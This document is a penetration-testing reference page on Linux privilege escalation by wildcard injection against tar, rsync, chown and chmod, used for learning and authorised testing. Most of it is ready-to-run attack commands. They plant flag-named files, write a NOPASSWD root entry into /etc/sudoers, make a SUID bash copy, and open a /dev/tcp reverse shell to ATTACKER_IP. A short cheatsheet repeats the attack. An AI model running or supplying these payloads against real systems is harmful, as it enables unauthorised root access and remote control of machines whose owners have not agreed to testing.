---
title: 'Wildcard Abuse'
description: 'Linux privilege escalation via wildcard injection — tar checkpoint exploitation, rsync, chown, chmod, and other commands vulnerable to filename-as-argument attacks.'
---

# Wildcard Abuse

When a command uses `*` (wildcard), the shell expands it to all filenames in the directory **before** passing them to the command. If you create files named like command-line flags (e.g., `--checkpoint=1`), those filenames become arguments to the command — allowing arbitrary command execution.

---

## Wildcard Characters Reference

| Character | Meaning |
|:----------|:--------|
| `*` | Matches any number of characters |
| `?` | Matches a single character |
| `[ ]` | Matches any single character in the set |
| `~` | Expands to home directory |
| `-` | Range within brackets (e.g., `[a-z]`) |

---

## 1. Tar Wildcard Injection (Most Common)

The classic and most frequently tested wildcard abuse. `tar` supports `--checkpoint` and `--checkpoint-action` flags that execute arbitrary commands.

### How It Works

When a cron job or script runs:

```bash
tar -zcf /backup/archive.tar.gz *
```

The shell expands `*` to all files in the directory. If files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh` exist, tar interprets them as flags and executes your payload.

### Step-by-Step Exploitation

```bash
# 1. Identify the vulnerable cron job / script
cat /etc/crontab
# Example: */01 * * * * cd /home/user && tar -zcf /backup/backup.tar.gz *

# 2. Navigate to the directory where tar runs with wildcard
cd /home/user

# 3. Create the payload script
echo 'echo "youruser ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh

# 4. Create the trigger files (filenames = tar arguments)
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# 5. Wait for cron to execute, then:
sudo -l
sudo su
# → root!
```

### Alternative Tar Payloads

```bash
# Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# SUID bash copy
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
# After cron runs: /tmp/rootbash -p

# Direct command execution (no script file needed)
echo "" > "--checkpoint-action=exec=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
echo "" > --checkpoint=1
```

!!! warning "File Creation Gotcha"
    When creating files starting with `--`, always use `echo "" >` or `touch -- "--filename"`. Using `touch --checkpoint=1` directly will fail because touch interprets it as a flag.

---

## 2. Rsync Wildcard Injection

`rsync` supports `-e` to specify a remote shell command. If a cron job runs `rsync` with wildcards:

```bash
# Vulnerable cron job:
rsync -a /important/files/* backup@remote:/backup/
```

### Exploitation

```bash
# Navigate to the source directory
cd /important/files

# Create payload
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create trigger filename
echo "" > "-e sh shell.sh"

# Wait for cron → /tmp/rootbash -p
```

---

## 3. Chown Wildcard Injection

If a cron job or script runs `chown` with wildcards:

```bash
# Vulnerable script:
chown user:group *
```

### Exploitation with `--reference`

```bash
# Create a file owned by root (or the desired owner)
# Use --reference to make chown copy ownership from a reference file

# Create a symlink to /etc/shadow or another sensitive file
ln -s /etc/shadow shadow_link

# Create the trigger
echo "" > "--reference=shadow_link"

# When chown runs with *, it will change ownership of files
# to match the reference file's ownership
```

---

## 4. Chmod Wildcard Injection

If a script runs `chmod` with wildcards:

```bash
# Vulnerable script:
chmod 700 *
```

### Exploitation with `--reference`

```bash
# Create a reference file with desired permissions
touch reference_file
chmod 4777 reference_file  # SUID + world-writable

# Create the trigger
echo "" > "--reference=reference_file"

# When chmod runs with *, all files get SUID permissions
```

---

## 5. Other Vulnerable Commands

| Command | Exploitable Flag | Effect |
|:--------|:----------------|:-------|
| `tar` | `--checkpoint-action=exec=CMD` | Execute arbitrary command |
| `rsync` | `-e CMD` | Execute command as remote shell |
| `chown` | `--reference=FILE` | Copy ownership from reference |
| `chmod` | `--reference=FILE` | Copy permissions from reference |
| `7z` | `@listfile` | Read file contents (info disclosure) |
| `zip` | `-T --unzip-command=CMD` | Execute command during test |
| `find` | `-exec CMD` | Already used for execution (not wildcard-specific) |

---

## 6. Detection & Enumeration

### Finding Wildcard Usage in Cron Jobs

```bash
# Search crontab for wildcard usage
grep -r "\*" /etc/crontab /etc/cron.d/ /var/spool/cron/ 2>/dev/null | grep -v "^#"

# Search all shell scripts for commands with wildcards
find / -name "*.sh" -exec grep -l " \*$\| \*'" {} \; 2>/dev/null

# Check systemd timers for script references
systemctl list-timers --all 2>/dev/null
```

### Verifying You Can Write to the Target Directory

```bash
# Check if you can write to the directory where wildcard expands
ls -la /path/to/directory/
touch /path/to/directory/test_write 2>/dev/null && echo "WRITABLE" && rm test_write
```

!!! tip "Key Conditions for Wildcard Abuse"
    All three must be true:

    1. A privileged process (root cron, SUID script) uses a command with `*`
    2. The command supports flags that enable code execution
    3. You have **write access** to the directory where `*` is expanded

---

## Cheatsheet — Tar Wildcard Abuse in 30 Seconds

```bash
# In the directory where the cron tar command runs:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# Wait for cron, then:
/tmp/rootbash -p
# → root
```
